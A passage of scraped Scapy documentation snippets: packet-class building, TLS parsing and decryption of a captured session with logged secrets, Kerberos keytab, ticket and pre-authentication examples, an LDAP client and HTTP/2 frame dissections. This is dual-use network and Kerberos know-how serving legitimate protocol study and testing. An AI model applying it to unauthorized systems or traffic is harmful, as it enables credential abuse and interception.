\\rj\\x0b\\xcf\\xc0E\\x14\\x13\\xfei\\x1b\\xe1\\xafQ\\xd4\\x93J\\xa7}\\x93\\xc5\\xb0L\\xea\\xcdceoH\\x07\\x7f\\xd8@^\\x8e\\xabYj7144\\xeb\\xb2\\x16i8\\xf16\\xfd\\xeb\\x96\\x8e6}\\xc1\\x91W=\\xb7\\x86\\x1d\\xb5\\xcb\\x00ZD3\\xcef\\xf5\\xc7\\x86\\xc5\\xa5\\x9c7\\xe5\\xacn\\x1a\\xf9\\x95\\x0b\\xa1Jf\\t,\\x80F\\x1b\\x88\\xd4\\xa2\\xf1\\x83q\\xe3.#k\"}\\x8c/BU\\xa2 \\xe5LGQ\\x1f(\\x0c\\xb1x\\x850}\\x14\\xc1\\xe7k?\\xe4\\xb09\\xeffa\"U\\xe1\\xa6\\xb7\\xf6~\\x17\\x04\\x90\\xab\\xca\\r\\xa5^5e\\xb4\\xf5K\\xf4\\xb6\\x19\\xb47a\\x92\\x15b\\xc7\\x82a\\xb2\\x84i\\xda\\x9ee\\xc8\\xdf\\xe1\\xae\\x97\\xe9\\xfa\\x8e\\x97I3\\xbb\\xd4\\xbb\\n\\xf2\\x14\\x1cuv\\xb8X,\\xec\\x12\\xd5\\x85(r\\xb5\\xa1-B{\\xdf\\xb5\\x13\\xc8\\xd7\\x1b:[\\xa2{\\xa8tF!r\\xae\\xd8\\xd77\\xc0\\xa6\\xbf\\x88\\x14\\xda\\xb6,\\x9d\\xadB\\xd8\\xb2\\xcc\\xaf;\\xc7c\\x9d\\x9a\\xee\\xdf\\xdbO\\x12kX\\xce\\xfe\\x00K.\\xed0\\xc0\\xf3\\xa9\"\\x95Q\\xe1U\\xf3\\x80\\x98;;\\x89\\xbb\\x91\\xb7nG\\xb91\\x1a\\x1e{a\\xc1\\xb5\\x89vlc\\xa0mv\\xec\"#e+<\\xc9\\xf8\\x14q\\xd7\\xddQ0c\\xcc.\\xbduV\\x066@\\xb3\\xb7\\xee\\x8b\\x8b\\xf3<O9\\x84cX\\xf5\\x03M\\xbb\\xf2\\xcd\\xa1\\xd6\\xf0\\xdcY\\x14hVD\\xea\\xe1\"\\x8aZ\\xcb}\\xcc\\xa34E7*\\x16\\xedU\\x15P\\xc1\\xd5g\\xee\\x84\\xae\\xe6P\\xe5\\xa4\\x86a\\xe1q\\xba\\x07\\x1ex\\x02\\x873\\x10\\x172\\x0b\\xa3\\xe2\\xa4^\\xae\\xd4\\xb1\\xdd\\xecL\\xcd\\xf6\\x8a\\x9c\\xc3w\\x96\\x86p\\x8c\\xcf\\xdbk\\xb6\\xb7\\x91\\xa4\\x10\\xb8*\\xf8*\\xb7\\xca\\xf8\\x91\\xad\\xf2X\\xcc\\xc5\\x15\\xd7\\x0e\\xd6V\\'(G\\xee\\xde\\xd9\"\\xf5\\n\\xbe\\xae\\xd9K\\xf3o\\xc3_\\x95\\xe8\\x9a\\x8c\\x078W\\n\\xa6\\xdeG\\xae\\x1a\\xa00\\xf7\\x0bO\\x0cB/m\\xee\\x1a\\xa2\\xd4\\xcf\\xfa\\xd0A@\\x07\\x91C\\xf8\\x12\\xfc\\xc6+\\x84\\x02]\\t\\x01\\xbe\\xe55\\x08n&\\xc5\\r\\xa4F\\x1c\\x82>F\\x1e\\xbde\\xc0\\xdc\\x8fE\\xe6\\xd1WT~$K\\x8a\\x90q(\\xbdi\\xc4\\x99\\xed\\x83l1\\x1c=\\xfa8CU\\x1a+\\x8e\\xf2\\xf0\\xe2\"Q:\\x1d\\xa5\\xfe\\xeeb\\xb9\\xa1t\\x1b\\xe2r\\xb2\\xde\\xba\\xa9\\xc9\\xbb=Y\\xeb\\xc2?{\\xf3\\x03\\xa2\\x1e\\xe0\\x9cP_\\xd7\\x14\\x8bNg\\xfb\\xdd\\xbf\\xeeK\\x1d\\x03\\xdb\\xa63p\\xaf\\xdb8\\xd8l\\xa1m~\\x80?xn\\xdc*\\xde\\x0fWJ\\x085g\\x9c\\x04.9S\\xea6&\\xd4\\xb3\\xd3$u\\xe1\\xd7U\\xbc\\x88r\\x0e}\\xfa\\xd9?\\x99\\x07Q\\r\\xfe\\x9d\\x0e\\\\\\xc0\\xa6\\xdb\\xa1\\xcaz\\xe5\\xf1j0\\xb8\\xb9iJ\\xf9E\\x0ej\\r\\x96\\xd9\\x93%TsyGP\\x17j3r&%\\xe6\\xa7\\x03\\xfaM>1$\\x8d\\x16#l\\xb6\\xf9D\\xe4\\xecW\\xe8\\xfa\\x1e\\x17\\xdc~5\\x17/\\x8d\\x07m\\x16&9{\\r\\xc3\\xdfc\\x81\\x02\\xdd\\x017\\x17n\\xc5\"\\x88\\x9c\\x9f\\xffY\\xb2\\xd0\\xc9\\xd9\\xbf\\xd3\\xe2-\\x0c}\\x8f\\x0b\\x98\\xba-Nr\\xc3w\\xf5\\x02\\xce\\xfb\\xd4\\x13\\x05l3\\xf1\\xe5o\\xe8&\\x8c\\xdaRa{\\xf0D\\xf2\\x89\\xc9\\xd93l~\\x8f\\x85\\x9f\\xc3\\xfe\\xdd\\xd1\\x8c$O\\xc9\\xd93\\x1cyH.7py\\xa5\\xb8\\x1f\\xdd\\xc9\\xb7] \\x11\\xd1\\x00`\\x9a!\\x01\\x1f\\xc0N,@\\xf1\\x05HY\\x9c)\\x9d\\x9c^\\x17\\xa9\\x8d\\xf3\\x9d\\x0eJ\\xb7\\x1b\\x80+6\\xfe)\\x0bXE\\x16\\x01\\x0e\\xd6\\x8c\\xb5o\\xf2\\x8c&\\xa5\\xbf&\\xcd\"C\\x8c+\\xd0\\xdf\\x1e]4\\xa3\\x8bGFY\\xd3G[2<\\x10\\x01\\x0e\\x17\"\\xcd\\xefP\\x04p\\x84\\xd2l\\xa4a<:{!\\xc7\\xc3\\xeb\\x82)'\n```\n\n----------------------------------------\n\nTITLE: Implementing Foo Packet Class with post_build() in Python for Scapy\nDESCRIPTION: This snippet defines a Foo packet class with a custom post_build() method. It demonstrates how to handle default values and compute lengths after the packet has been initially built.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/build_dissect.rst#2025-04-23_snippet_13\n\nLANGUAGE: Python\nCODE:\n```\nclass Foo(Packet):\n      fields_desc = [\n          ByteField(\"type\", 0),\n          XNumberField(\"len\", None, \"\\r\\n\"),\n          StrFixedLenField(\"sep\", \"\\r\\n\", 2)\n          ]\n        \n      def post_build(self, p, pay):\n        if self.len is None and pay:\n            l = len(pay)\n            p = p[:1] + hex(l)[2:]+ p[2:]\n        return p+pay\n```\n\n----------------------------------------\n\nTITLE: Creating Client Keytab in Scapy\nDESCRIPTION: This code demonstrates how to create a client keytab file in Scapy by adding credentials for a principal with multiple encryption types. It prompts for a password and generates keys for AES128, AES256, and RC4 encryption types.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/kerberos.rst#2025-04-23_snippet_9\n\nLANGUAGE: python\nCODE:\n```\n>>> t = Ticketer()\n>>> t.add_cred(\"Administrator@domain.local\", etypes=\"all\")\nEnter password: ************\n>>> t.show()\nKeytab name: UNSAVED\nPrincipal                   Timestamp          KVNO  Keytype\nAdministrator@domain.local  15/04/25 20:24:13  1     AES128-CTS-HMAC-SHA1-96\nAdministrator@domain.local  15/04/25 20:24:13  2     AES256-CTS-HMAC-SHA1-96\nAdministrator@domain.local  15/04/25 20:24:13  3     RC4-HMAC\n\nNo tickets in CCache.\n```\n\n----------------------------------------\n\nTITLE: Importing .NET Remoting Protocol in Scapy\nDESCRIPTION: This snippet demonstrates how to import the .NET Remoting protocol implementation in Scapy. It loads the ms_nrtp module, which contains classes for both the .NET remote protocol (NRTP*) and the .NET Binary Formatter (NRBF*).\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/dotnet.rst#2025-04-23_snippet_0\n\nLANGUAGE: Python\nCODE:\n```\nfrom scapy.layers.ms_nrtp import *\n```\n\n----------------------------------------\n\nTITLE: Parsing Certificate Record\nDESCRIPTION: Reads and parses the Certificate message from the TLS handshake\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook2_tls_protected.ipynb#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\nrecord3 = TLS(open('raw_data/tls_session_protected/03_srv.raw', 'rb').read())\nrecord3.show()\n```\n\n----------------------------------------\n\nTITLE: Using ISOTPSocket with Context Manager in Python\nDESCRIPTION: Demonstrates the recommended way to create and use ISOTPSockets using a context manager for proper resource handling.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_23\n\nLANGUAGE: Python\nCODE:\n```\nwith ISOTPSocket(\"vcan0\", rx_id=0x241, tx_id=0x641) as sock:\n    sock.send(...)\n```\n\n----------------------------------------\n\nTITLE: Enabling SCTP Chunk Authentication in Linux\nDESCRIPTION: This command enables the capability to authenticate SCTP chunks as described in RFC 4895. It modifies the Linux kernel parameter to enable this feature.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/sctp.rst#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ sudo echo 1 > /proc/sys/net/sctp/auth_enable\n```\n\n----------------------------------------\n\nTITLE: Manual TLS Decryption Process\nDESCRIPTION: Demonstrates manual TLS decryption by processing individual packets and managing session state\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook3_tls_compromised.ipynb#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\nclient_hello = TLS(raw(packets[3][TLS]))\n\nserver_hello = TLS(raw(packets[5][TLS]), tls_session=client_hello.tls_session.mirror())\n\nserver_hello.tls_session.master_secret = nss_keys[\"CLIENT_RANDOM\"][\"Secret\"]\n\nclient_finished = TLS(raw(packets[7][TLS]), tls_session=server_hello.tls_session.mirror())\nserver_finished = TLS(raw(packets[9][TLS]), tls_session=client_finished.tls_session.mirror())\n```\n\n----------------------------------------\n\nTITLE: Encrypting Kerberos Pre-Authentication Data in Scapy\nDESCRIPTION: This code demonstrates how to encrypt pre-authentication data (PA-ENC-TIMESTAMP) using a derived key and current timestamp.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/kerberos.rst#2025-04-23_snippet_26\n\nLANGUAGE: python\nCODE:\n```\n>>> from datetime import datetime\n>>> from scapy.libs.rfc3961 import Key, EncryptionType\n>>> # Create the PADATA layer with its EncryptedValue\n>>> pkt = PADATA(padataType=0x2, padataValue=EncryptedData())\n>>> # Compute the key\n>>> key = Key.string_to_key(EncryptionType.AES256_CTS_HMAC_SHA1_96, b\"Password1\", b\"DOMAIN.LOCALUser1\")\n>>> now_time = datetime.now(timezone.utc).replace(microsecond=0)  # Current time with no milliseconds\n>>> # Encrypt\n>>> pkt.padataValue.encrypt(key, PA_ENC_TS_ENC(patimestamp=ASN1_GENERALIZED_TIME(now_time)))\n>>> pkt.show()\n###[ PADATA ]### \n    padataType= 2\n    \\padataValue\\\n    |###[ EncryptedData ]### \n    |  etype     = 18\n    |  kvno      = 0x0 <ASN1_INTEGER[0]>\n    |  cipher    = b\"\\xc1\\x9a\\xaf\\x89V\\x16\\x82\\xb6\\x9a\\xcb\\x15[\\xaf\\xed\\xd9\\xfc\\x04\\xbf\\x18\\xd4&\\x91\\xb3\\xcf~tEk,\\x98m\\xee\\xa4O\\x05=\\x11b\\xe05\\xca\\x92+80\\x99\\xb1'~\\x8d\\xdbtz\\xa8\"\n```\n\n----------------------------------------\n\nTITLE: Connecting to LDAP Server in Python with Scapy\nDESCRIPTION: Shows how to instantiate the LDAP_Client and connect to a server over the default port (389) or using TLS.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/ldap.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nclient = LDAP_Client()\nclient.connect(\"192.168.0.100\")\n```\n\nLANGUAGE: python\nCODE:\n```\nclient = LDAP_Client()\nclient.connect(\"192.168.0.100\", use_ssl=True)\n```\n\nLANGUAGE: python\nCODE:\n```\nimport ssl\nclient = LDAP_Client()\nsslcontext = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\nsslcontext.load_verify_locations('path/to/ca.crt')\nclient.connect(\"192.168.0.100\", use_ssl=True, sspcontext=sslcontext)\n```\n\n----------------------------------------\n\nTITLE: IP Packet Manipulation in Scapy\nDESCRIPTION: Shows how to create and inspect IP packet properties including destination address and TTL values using Scapy's Python interface.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/introduction.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\n>>> IP()\n<IP |>\n>>> a=IP(dst=\"172.16.1.40\")\n>>> a\n<IP dst=172.16.1.40 |>\n>>> a.dst\n'172.16.1.40'\n>>> a.ttl\n64\n```\n\n----------------------------------------\n\nTITLE: Implementing XNumberField Class in Python for Scapy Custom Field\nDESCRIPTION: This code defines a custom XNumberField class that extends FieldLenField. It implements methods for converting between internal and machine representations, as well as adding and getting field values.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/build_dissect.rst#2025-04-23_snippet_12\n\nLANGUAGE: Python\nCODE:\n```\nclass XNumberField(FieldLenField):\n\n    def __init__(self, name, default, sep=\"\\r\\n\"):\n        FieldLenField.__init__(self, name, default, fld)\n        self.sep = sep\n\n    def i2m(self, pkt, x):\n        x = FieldLenField.i2m(self, pkt, x)\n        return \"%02x\" % x\n\n    def m2i(self, pkt, x):\n        return int(x, 16)\n\n    def addfield(self, pkt, s, val):\n        return s+self.i2m(pkt, val)\n\n    def getfield(self, pkt, s):\n        sep = s.find(self.sep)\n        return s[sep:], self.m2i(pkt, s[:sep])\n```\n\n----------------------------------------\n\nTITLE: Python File Reading Best Practice Example\nDESCRIPTION: Demonstrates the preferred way to read files in Python to avoid unnecessary memory usage, using generators instead of lists.\nSOURCE: https://github.com/secdev/scapy/blob/master/CONTRIBUTING.md#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nfor line in fdesc\n```\n\n----------------------------------------\n\nTITLE: Installing Sphinx and Building HTML Documentation for Scapy\nDESCRIPTION: This snippet shows how to install Sphinx and build the HTML version of Scapy's documentation. It includes activating a virtual environment, installing dependencies, and running the build command.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/installation.rst#2025-04-23_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\n(activate a virtualenv)\npip install sphinx\ncd doc/scapy\nmake html\n```\n\n----------------------------------------\n\nTITLE: Processing Client Finished Message\nDESCRIPTION: Processes the client's ChangeCipherSpec and Finished messages for middlebox compatibility.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook4_tls13.ipynb#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\n# Client ChangeCipherSpec (middlebox compatibility) + Finished\nrecord7_str = open('raw_data/tls_session_13/07_cli.raw', 'rb').read()\nrecord7 = TLS(record7_str, tls_session=sess.mirror())\nrecord7.show()\n```\n\n----------------------------------------\n\nTITLE: Sending HTTP/2 Client Connection Preface with Scapy in Python\nDESCRIPTION: Sends the HTTP/2 client connection preface string to confirm protocol support to the server.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\nimport scapy.packet as packet\n\n# We verify that the server window is large enough for us to send some data.\nsrv_global_window -= len(h2.H2_CLIENT_CONNECTION_PREFACE)\nassert(srv_global_window >= 0)\n\nss.send(packet.Raw(h2.H2_CLIENT_CONNECTION_PREFACE))\n```\n\n----------------------------------------\n\nTITLE: Enabling SCTP Dynamic Address Reconfiguration without Authentication in Linux\nDESCRIPTION: This command enables the dynamic address reconfiguration capability for SCTP without requiring chunk authentication. It modifies the Linux kernel parameter to enable this feature.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/sctp.rst#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n$ sudo echo 1 > /proc/sys/net/sctp/addip_noauth_enable\n```\n\n----------------------------------------\n\nTITLE: Requesting a Kerberos Service Ticket using TGT in Scapy\nDESCRIPTION: This code shows how to request a Service Ticket (ST) using a previously acquired TGT. The request_st method takes the TGT ID and the target service principal name as parameters.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/kerberos.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\n>>> # The TGT we just got has an ID of 0\n>>> t.request_st(0, \"host/dc1.domain.local\")\n>>> t.show()\nTickets:\n0. Administrator@DOMAIN.LOCAL -> krbtgt/DOMAIN.LOCAL@DOMAIN.LOCAL\nStart time         End time           Renew until        Auth time        \n31/08/23 11:38:34  31/08/23 21:38:34  31/08/23 21:38:35  31/08/23 01:38:34\n\n1. Administrator@DOMAIN.LOCAL -> host/dc1.domain.local@DOMAIN.LOCAL\nStart time         End time           Renew until        Auth time        \n31/08/23 11:39:07  31/08/23 21:38:34  31/08/23 21:38:35  31/08/23 01:38:34\n```\n\n----------------------------------------\n\nTITLE: Analyzing Certificate Chain\nDESCRIPTION: Iterates through and displays all certificates in the chain\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook2_tls_protected.ipynb#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\nfor cert in record3.msg[0].certs:\n    print(type(cert[1]))\n    cert[1].show()\n    print('')\n```\n\n----------------------------------------\n\nTITLE: Getting MAC Address of Next Hop in Scapy\nDESCRIPTION: Shows how to obtain the MAC address of the next hop to reach an IP address using Scapy's getmacbyip() function.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/routing.rst#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\n>>> mac = getmacbyip(\"10.0.0.1\")\n>>> mac\n'f3:ae:5e:76:31:9b'\n```\n\n----------------------------------------\n\nTITLE: Examining HTTP/2 Frame with HPack Header Compression in Scapy\nDESCRIPTION: A detailed packet dissection of an HTTP/2 Headers Frame using Scapy's packet inspection capabilities. The snippet shows the binary data and its structured representation including the frame type, flags, stream ID, and the HPack compressed headers with various compression techniques.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_24\n\nLANGUAGE: python\nCODE:\n```\n   |     data      = '\\x1f\\x8b\\x08\\x00\\x00\\tn\\x88\\x02\\xff\\xbcX{PTU\\x18?\\xa6\\x8d\\x89\\xa5\\xf4G\\xff5\\x13\\xf60\\xffh\\xcc1\\x11\\xc7L\\xb3\\x07>\\xffp\\x94\\x10L\\x1b\\xd3L+kF\\'\\xb5\\x19\\xc7Rg\\xc2\\xb4@KtD _\\x91\\x80\\x8e\\x82\\x8a\\xa8\\x83\\nhI\\xa9\\xa8\\x08B\\x98\\xaf|\\xdf]`\\xc1}\\xb0{\\xf7;\\xbf\\xe6\\\\\\xeee\\xee\\xde\\xbd\\x97\\xdd\\xb5\\xb53\\xf3\\rg\\xcf\\xfd\\xbe\\xefw\\xcew\\xbe\\xd7\\x81\\xb1n\\xec1\\x16\\x1b+\\xfe\\xc6\\xb1y=\\x18\\xeb\\xcf\\x18\\x8b\\x8b\\xeb\\xf8\\x9d\\x1f\\xcbXF\\x0f\\xc6\\x060\\xc6b\\xc5:\\xebXWF\\x0f\\x16r\\x00\\x18DD\\x1b\\x89\\xa8\\x81\\x88\\xbc*\\xd5\\x13Q&\\xe7|\\xa0\\x95\\x1c\\xe7\\xbc\\x17\\x11e!\\xc4 \\xa2\\r\\x00\\x9e0\\x91\\xad\\x10\\xdf}\\xe4\\xc5\\x81\\xbfvb\\xf1\\x91\\x19H\\xd95\\x1c)\\x85\\xc3\\xb1\\xf0P*v\\xd7\\xe5\\xa2]vk:\\x8e\\xebuh\\xb8v\\xd7},(M\\xc1\\x94\\xfc!\\xa6\\x94\\xb17\\x05\\xdcq\\xafs\\x1f\\xday\\x15\\\\\\xbf\\x17\\x0bJ\\xa7*|\\x02s\\xfb\\xf9\\x1fQ{\\xff\\x0c.I\\xd5(\\xac\\xcdF\\xd6\\x8e\\xf1p\\xa4\\x8d\\x86;w.\\xc0\\xb9\\xa2C\\xd8\\x83\\x886\\x89\\xf9\\xeaKg1\\xa1p,\\x92\\x0b\\x87\\xa1N\\xaa\\x0e>\\xf7\\x9d\\x068W%\\xc2\\xf9\\xed[\\xf07\\x9c\\xd0\\xf6\\x90ID\\x8db\\xfe\\xca\\xc9V<]\\xd6\\x84\\xf4\\x0bE\\x96\\xb6k\\xdf\\xb3R\\x91o/I\\xd7\\xe4\\xc5\\xbd\\xf8\\xc4<\\xe6\\xa8\\x8c\\xc7\\xcbd\\x94\\xd8x\\x80\\x8c\\xe07\\x92\\xe7\\xd7E\\x9a\\xbcW\\x93\\xef}\\xacC\\xfe\\xa0=\\x0c\\xf9\\xc2\\xa5z\\xf9\\xcbb\\x1e\\xff\\x87\\x1f1\\xfb\\xbc\\xf8\\xec\\x177\\xc2\\x1d\\xaa\\x8f)w\\xf7\\xd39\\x19\\t\\x93\\xed\\x18\\x96(\\xe1|\\xad\\xcf\\x84\\xd7T~#\\xe7|\\xb0\\x98{\\xbd\\x1c\\xc9\\xb3\\x9a\\x10\\xff\\xb6\\x84\\xd7\\xc7\\xd9\\xb0!\\xc7\\x89s5>\\\\\\xa8\\xf5ac\\xae\\x13\\x93?h\\xc2\\x8d\\x9b~\\xa3\\x8aA\\xaa\\xff\\xe4\\x8a\\x1f\\xf7$B\\xca\\xecfE\\x87\\x19\\xcd_\\xec\\xd0co\\xd2\\xc5L\\x0c\\x11\\x9d\\xd0\\xf6\\x91\\xb7\\xdb\\x8d\\x19\\x9f4c\\xc4x\\x1b\\x86\\x8f\\x910\\xed\\xe3fl/p)\\xdfT\\xd9\\n\\xe1\\xf3\\x86\\xb8\\x8b\\xd1\\xf6\\x11\\xc2fYFYC,\\r\\x16<\\xe2^\\xc4\\xdd\\xaa\\xd4\\xa8\\xfa\\xe9 #\\xbf\\xa3/c\\xe5\\xdd\\x19[\\xde\\xad\\x83B\\r\\x8dO\\xc8\\x08\\xd9\\x01j\\x8eyS\\x9fgb\\xd9C\\x0f\\xce\\xf9S\\x9c\\xf3\\xa9\\xea\\x19\\xaa\\x88H\\xd2\\xe5!I]\\x136H\\x06\\xf0$\\x8b\\xd2\\xe0\\x9c\\xbfHD9D\\xe4\\x8a\\xc0\\x7f]D\\xb4\\x99s\\xfe\\xc2\\x7f\\xc0\\x15\\xb9o\\r\\x11\\xc9x\\xc8\\xa1\\xde\\xf1*c^\\r\\xf3\\xcc5\\x88\\xd2 \\xa2\\xf3\\x00\\x9e\\x0f\\x07[\\xad3\\x92\\x99\\x1e\\xc9y\\x07{\\xeb\\xb7ae\\xf9|\\xcc)\\x1e\\xa7\\xe4\\xd4\\xe4\\x82\\x04\\xcc.J\\xc4\\xb2\\xa3s\\x90W\\xb3\\x01W\\x9b\\x1b\\xac\\xf6p\\x8fs\\xfej\\x18\\xe7\\x0e\\xc2\\xb6\\xb9\\xeeb\\xed\\xefK\\x91T0\\xd4\\xb2\\x86\\xe8\\xe9\\xebcsq\\xa5\\xb9\\xdet\\x0fVvP\\xe3\\xfc\\xa2Q\\xe6\\xe4\\x8d\\xc3\\x98\\xbe{dX\\xb8z\\x12v)\\xae\\xc9\\xb6\\xba\\x8b \\x7f \\xa2\\xef\\x8d\\xbc\\xc5\\r;\"\\xc6\\xd5hf^<\\xfe\\xcc\\x18\\to\\xc5\\x16\\xb3=\\xac2\\xd8\\xfd%\\xa3\\x9fW^/\\xb5\\xd4\\xfd\\xc5\\xc1$l\\xa9NGic!\\x0e]\\xde\\xa5\\xdc\\xfb\\xd2\\xb2\\x8f\\x90\\x94\\x1f\\xaf|_\\xb25\\x017W\\x8f\\xee\\xacKZ]\\xd5\\xc7\\x85>6\\x8d\\xf9U\\xf8\\xd9\\xfb&6\\x9f\\xbbo\"\\xce\\xdc\\xae\\xb4\\xf4\\xf3\\xeb-\\x8d\\xc8/\\x9e\\x8dVC]t\\xadK\\x02\\xf7\\xba\\x8d{\\xd8\\xac\\x9e\\xbd\\x0f\\x11\\x05|\\\\yjm\\x10\\xf6\\xa2\\xc3\\xd3\\xd1\\xe6u\\x84\\x0e6\\xbf\\x0f\\x9e\\x9dK\\x82j\\xb3\\xaf\\xaa (G\\x89<\\xc99O\\xd5\\xaf_ss\\xf4*s\\xe3\\xb5\\xa2\\xb4N\\xecYE\\x89h\\xf1\\xd8\\xc3\\x8ew\\xeey\\xa0\\x9cY\\x8f\\xef\\xce\\x9a\\x19\\xcc\\xc7y\\xb2\\xc8\\xad\\xfa\\xb5\\xef\\xae\\x91\\xd2o\\x08\\xeaW\\xb2\\x1f\\x93\\xf2G\\xa0\\xecJQ\\xc49\\xc7w*?\\xc8\\x06\\xdcq7\\xa8f\\x12\\xd1i\\xfd\\xda\\x98j\\x7f\\'\\xbe\\xa0\\x81\\x95\\xb7 \\x93/\\xf2\\x9c\\']\\r\\xc2\\x97\\xeb+\\x8c\\xf8\\xa2f\\x05\\x18\\xf6\\xd9J9\\x00?\\xa5\\xc6\\xdf%\\x8eY\\x1ffE\\xbe\\xaaB#\\xbe\\xa4\\xf5y\\xda\\xe8y4\\x10\\x7f\\xd9\\xdf\\x145|c.\\xd0\\xf7\\x99\\xff\\x07\\xbe\\xef\\xb7<3\\xfc\\xa6\\xae\\xec\\x9fz1z\\xf6\\x97\\xeb\\x8e\\x9b\\xd9?\\xc0\\xff\\x12\\xcf\\x06\\xfa_\\xbf=^\\xc82\\x1e\\xc9P\\xfd/ \\xfe\\xd2t\\xf1\\xf7\\xccz\\x17\\x86\\x8c\\xb3a\\xff!\\xcf\\xa3\\xc2\\x17\\xfd\\xda4\\xfd\\xda\\x157G\\xcf\\xc32\\xe2\\x96\\xb4v\\xf6\\xd7c\\xdf\\xb3\\xa3\\xd9AQ\\xc7\\x17\\xfd$\\x80\\xbeD\\x14p\\xc0\\xcf\\xd79\\x83z\\xfc\\x0f\\xe7\\xb7\\xa0\\xad\\x8d\\x87\\xd4\\xe9t\\xf1\\xb0{D\\xd1\\xd3\\xaa\\xf5\\' 0n\\xdd\\xf1\\xe3\\x8d\\xf1\\xb6\\xa0=L\\x9a\\xde\\x84\\xaa3^K\\x9d\\xa7N{11\\xc5\\x8e\\x1f2\\x1f\\x84\\x83\\x9f\\xa3\\xab\\xbf/\\x13Q\\x80\\xa3\\x97\\x1c\\xf1X\\xbewR\\xe74c}\\xb6\\x13{\\x0ex\\xb0\\xb7\\xc4\\x83\\xccl\\xa7\\xf2\\x96\\xd1\\xf3\\xa4e\\xb4i\\xcfa3lY\\xf4Z\\x86\\xfe#\\xdd\\xc8\\xb7u\\xa7\\xcbr\\x0f\\xe1\\xd0\\x8a5mV\\xf8kLz\\xbf\\xdeDTg\\xe4\\x15v\\x189\\xc1\\x161\\xf6\\xa8\\x896\\x1c9\\xden\\x86]c\\xf5N\\xe3\\x9c\\xf7\\'\"\\x9bQ\\xe6\\xf6]?\\xbeZ\\xd1\\x8a\\xa1\\xef\\x84\\xc6\\x15<\\x8b\\xbfiUdL\\xb0%\\xa3\\xdd-\\xde\\x8963\\xbb\\t\\xbf\\xfc9\\xcf\\x85O\\xbft(1)\\xde\\xe4\\t\\xefJH\\x9cb\\xc7\\xbc\\x85-\\xd8\\xbc\\xcd\\x85\\x7fn\\xf9\\xadl.\\x99\\xbd3\\xbb\\xb0C]\\x14\\xf3LM\\xa8s[\\xf4\\xe3\\xe9\\xc6\\xb8\\x88\\x10W\\x16}uW\\xef\\xf20l!bs\\x8b1G\\x85\\xc0u\\x8b\\x9eV\\xf4\\xd5Q|\\x07\\xf7\\x11\\xb9Z}\\x0b\\x9f\\x16uS\\xf7\\x7f\\x04\\xbb\\xba\\x96#\\xfaI\\xc1\\x1b\\xb6\\x9d\\xcb\\xbb\\x03\\x8c\\xc1\\xcf\\xd8\\xa8v\\xc6\\x9es0\\xd6\\xf7:c=\\xcb\\x19\\xeb.h9c\\xdd\\x04E\\xba_MN\\xd3#t\\n\\xdd\\x02C`\\tL\\x81\\xfdo\\x00\\x00\\x00\\xff\\xff\\xc6\\xf9Yo6\\x15\\x00\\x00'\n```\n\n----------------------------------------\n\nTITLE: Packet Building Implementation in Python/Scapy\nDESCRIPTION: Core method for building packet layers and combining them with payloads\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/build_dissect.rst#2025-04-23_snippet_10\n\nLANGUAGE: python\nCODE:\n```\ndef build(self,internal=0):\n    pkt = self.do_build()\n    pay = self.build_payload()\n    p = self.post_build(pkt,pay)\n    if not internal:\n        pkt = self\n        while pkt.haslayer(Padding):\n            pkt = pkt.getlayer(Padding)\n            p += pkt.load\n            pkt = pkt.payload\n    return p\n```\n\n----------------------------------------\n\nTITLE: HTTP/2 Headers Frame with HPack Compression\nDESCRIPTION: Complex HTTP/2 Headers frame showing HPack header compression with indexed and literal header fields. Includes various HTTP headers like date, cache control, content type etc.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_18\n\nLANGUAGE: python\nCODE:\n```\n###[ HTTP/2 Frame ]### \n  len       = 0x167\n  type      = HdrsFrm\n  flags     = set(['End Headers (EH)']), reserved  = 0L\n  stream_id = 1L\n###[ HTTP/2 Headers Frame ]### \n     \\hdrs      \\\n      |###[ HPack Indexed Header Field ]### \n      |  magic     = 1\n      |  index     = 8\n```\n\n----------------------------------------\n\nTITLE: Importing Scapy Library\nDESCRIPTION: Imports all modules from Scapy library for network packet manipulation and analysis.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/graphs-ipids.ipynb#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nfrom scapy.all 